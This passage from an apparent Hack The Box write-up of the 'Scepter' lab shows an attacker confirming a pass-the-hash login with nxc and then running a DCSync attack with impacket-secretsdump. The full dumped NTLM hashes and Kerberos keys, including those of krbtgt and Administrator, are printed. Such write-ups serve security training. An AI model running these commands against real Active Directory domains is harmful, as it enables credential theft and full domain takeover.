[*] Wrote credential cache to 'p.adams.ccache'
[*] Trying to retrieve NT hash for 'p.adams'
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
```

##### proof

```bash
┌──(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# nxc smb dc01.scepter.htb -u p.adams -H '1b925c524f447bb821a8789c4b118ce0'
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.65     445    DC01             [+] scepter.htb\p.adams:1b925c524f447bb821a8789c4b118ce0
```





## DCSync on dc01.scepter.htb

>>The **DCSync attack** is a post-exploitation technique where an attacker simulates the behavior of a Domain Controller (DC) to request password hashes and secrets from another DC via **replication protocols**. By abusing permissions like **Replicating Directory Changes** and **Replicating Directory Changes All**, the attacker can use tools like Mimikatz to retrieve NTLM hashes, Kerberos keys, and even the **KRBTGT account hash**, which can be used to forge Golden Tickets. This technique does not require code execution on the Domain Controller itself—only the right privileges on an account—making it stealthy and powerful for gaining full domain persistence.


![](/assets/images/HTB-Scepter/Pasted_image_20250718164455.png)

```bash
┌──(root㉿kali2025)-[~/Desktop/HackTheBox/machines/scepter]
└─# impacket-secretsdump -dc-ip 10.10.11.65 scepter.htb/p.adams@dc01.scepter.htb -hashes ':1b925c524f447bb821a8789c4b118ce0' -just-dc
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
d.baker\d.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::
scepter.htb\a.carter:1107:aad3b435b51404eeaad3b435b51404ee:2e24650b1e4f376fa574da438078d200:::
scepter.htb\h.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::
scepter.htb\p.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::
scepter.htb\e.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::
scepter.htb\o.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::
scepter.htb\M.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cc5d676d45f8287aef2f1abcd65213d9575c86c54c9b1977935983e28348bcd5
Administrator:aes128-cts-hmac-sha1-96:bb557b22bad08c219ce7425f2fe0b70c
Administrator:des-cbc-md5:f79d45bf688aa238
krbtgt:aes256-cts-hmac-sha1-96:5d62c1b68af2bb009bb4875327edd5e4065ef2bf08e38c4ea0e609406d6279ee
krbtgt:aes128-cts-hmac-sha1-96:b9bc4dc299fe99a4e086bbf2110ad676
krbtgt:des-cbc-md5:57f8ef4f4c7f6245
d.baker\d.baker:aes256-cts-hmac-sha1-96:6adbc9de0cb3fb631434e513b1b282970fdc3ca089181991fb7036a05c6212fb
d.baker\d.baker:aes128-cts-hmac-sha1-96:eb3e28d1b99120b4f642419c99a7ac19
d.baker\d.baker:des-cbc-md5:2fce8a3426c8c2c1
scepter.htb\a.carter:aes256-cts-hmac-sha1-96:5a793dad7f782356cb6a741fe73ddd650ca054870f0c6d70fadcae162a389a71
scepter.htb\a.carter:aes128-cts-hmac-sha1-96:f7643849c000f5a7a6bd5c88c4724afd
scepter.htb\a.carter:des-cbc-md5:d607b098cb5e679b
scepter.htb\h.brown:aes256-cts-hmac-sha1-96:5779e2a207a7c94d20be1a105bed84e3b691a5f2890a7775d8f036741dadbc02
scepter.htb\h.brown:aes128-cts-hmac-sha1-96:1345228e68dce06f6109d4d64409007d
scepter.htb\h.brown:des-cbc-md5:6e6dd30151cb58c7
scepter.htb\p.adams:aes256-cts-hmac-sha1-96:0fa360ee62cb0e7ba851fce9fd982382c049ba3b6224cceb2abd2628c310c22f
scepter.htb\p.adams:aes128-cts-hmac-sha1-96:85462bdef70af52770b2260963e7b39f
scepter.htb\p.adams:des-cbc-md5:f7a26e794949fd61
scepter.htb\e.lewis:aes256-cts-hmac-sha1-96:1cfd55c20eadbaf4b8183c302a55c459a2235b88540ccd75419d430e049a4a2b
scepter.htb\e.lewis:aes128-cts-hmac-sha1-96:a8641db596e1d26b6a6943fc7a9e4bea
scepter.htb\e.lewis:des-cbc-md5:57e9291aad91fe7f
scepter.htb\o.scott:aes256-cts-hmac-sha1-96:4fe8037a8176334ebce849d546e826a1248c01e9da42bcbd13031b28ddf26f25
scepter.htb\o.scott:aes128-cts-hmac-sha1-96:37f1bd1cb49c4923da5fc82b347a25eb
scepter.htb\o.scott:des-cbc-md5:e329e37fda6e0df7
scepter.htb\M.clark:aes256-cts-hmac-sha1-96:a0890aa7efc9a1a14f67158292a18ff4ca139d674065e0e4417c90e5a878ebe0
scepter.htb\M.clark:aes128-cts-hmac-sha1-96:84993bbad33c139287239015be840598
scepter.htb\M.clark:des-cbc-md5:4c7f5dfbdcadba94
DC01$:aes256-cts-hmac-sha1-96:4da645efa2717daf52672afe81afb3dc8952aad72fc96de3a9feff0d6cce71e1
DC01$:aes128-cts-hmac-sha1-96:a9f8923d526f6437f5ed343efab8f77a
DC01$:des-cbc-md5:d6923e61a83d51ef
[*] Cleaning up...
```